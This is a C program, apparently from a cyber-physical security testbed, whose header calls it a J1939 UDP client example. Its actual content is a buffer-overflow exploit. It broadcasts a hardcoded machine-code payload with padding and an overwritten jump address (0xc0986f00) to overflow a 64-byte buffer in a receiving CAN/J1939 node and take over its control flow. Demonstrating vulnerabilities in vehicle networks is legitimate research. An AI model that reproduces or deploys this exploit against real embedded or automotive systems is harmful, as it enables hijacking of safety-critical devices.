/*
 * J1939 UDP Client Example Program
 *
 * author: Ethan Lew <elew@galois.com>
 *
 * Send a message over UDP using the CAN J1939 BAM protocol
 */
#include "can.h"
#include "cyberphys.h"
#include "j1939.h"
#include <arpa/inet.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>

#define PORT 5001
#define PGN 60879
#define TARGET_ADDR "10.88.88.255"
#define JUMP_ADDR 0xc0986f00

#define OVERFLOW_PACKET_ADDR_IDX 80 // 64+16
#define OVERFLOW_PACKET_SIZE 88 // 64+16+8

int main(int argc, char *argv[])
{
    /* setup the socket to broadcast */
    int sockfd, broadcast;
    struct sockaddr_in servaddr;

    if ((sockfd = socket(AF_INET, SOCK_DGRAM, 0)) < 0)
    {
        perror("socket creation failed");
        exit(EXIT_FAILURE);
    }

    broadcast = 1;
    if (setsockopt(sockfd, SOL_SOCKET, SO_BROADCAST, &broadcast,
                   sizeof(broadcast)) < 0)
    {
        perror("socket configuration failed");
        close(sockfd);
        exit(EXIT_FAILURE);
    }

    memset(&servaddr, 0, sizeof(servaddr));
    servaddr.sin_family = AF_INET;
    servaddr.sin_port = htons(PORT);
    inet_pton(AF_INET, TARGET_ADDR, &servaddr.sin_addr.s_addr);

    printf("servaddr.sin_addr.s_addr: %u\r\n", servaddr.sin_addr.s_addr);

    char chr;
    uint8_t res;

    /* Send a dummy test message first */
    /*
    const char msg[] = "This is a message from J1939 client: Hello World";
    printf("Sending dummy message, %u bytes long.\n",sizeof(msg));
    res = send_can_message(sockfd, &servaddr, PGN, (void *)&msg, sizeof(msg));
    printf("response: %u\n", res);

    printf("Press a key.");
    scanf("%c",&chr);
    */

    /* Send the payload */
    char payload[] = {0x37,0x1e,0xc,0x0,0x1b,0xe,0x7e,0x98,0x13,0x1e,0xce,0x0,0x13,0xe,0xce,0xee,0x93,0xe,0x10,0x0,0x23,0x0,0xde,0x1,0x37,0x1e,0xc,0x0,0x1b,0xe,0x7e,0x98,0x13,0x1e,0xce,0x0,0x13,0xe,0xae,0xef,0x93,0xe,0x10,0x0,0x23,0x0,0xde,0x1,0xb7,0x0,0xc,0x0,0x9b,0x80,0x70,0x1,0x93,0x90,0xc0,0x0,0x93,0x80,0x40,0xdc,};
    /*
    printf("Sending payload, %u bytes long\n", sizeof(payload));
    res = send_can_message(sockfd, &servaddr, PGN, (void *)&payload, sizeof(payload));
    printf("response: %u\n", res);

    printf("Press a key.");
    scanf("%c",&chr);
    */

    /* Send the buffer overflow message */
    char buffer[128];
    memset(buffer, 0xb4, sizeof(buffer));
    memcpy(buffer, payload, sizeof(payload));
    /* 64 bytes of regular buffer + 32 bytes after + 8 bytes for the address */
    uint32_t addr = JUMP_ADDR;

    memcpy(&buffer[OVERFLOW_PACKET_ADDR_IDX], &addr, sizeof(addr));
    size_t len = OVERFLOW_PACKET_SIZE;
    printf("Sending jump, %u bytes long\n", len);
    res = send_can_message(sockfd, &servaddr, PGN, (void *)&buffer, len);
    printf("response: %u\n", res);

    printf("Press a key.");
    scanf("%c",&chr);

    /* close and free */
    close(sockfd);

    printf("Done\n");
    return 0;
}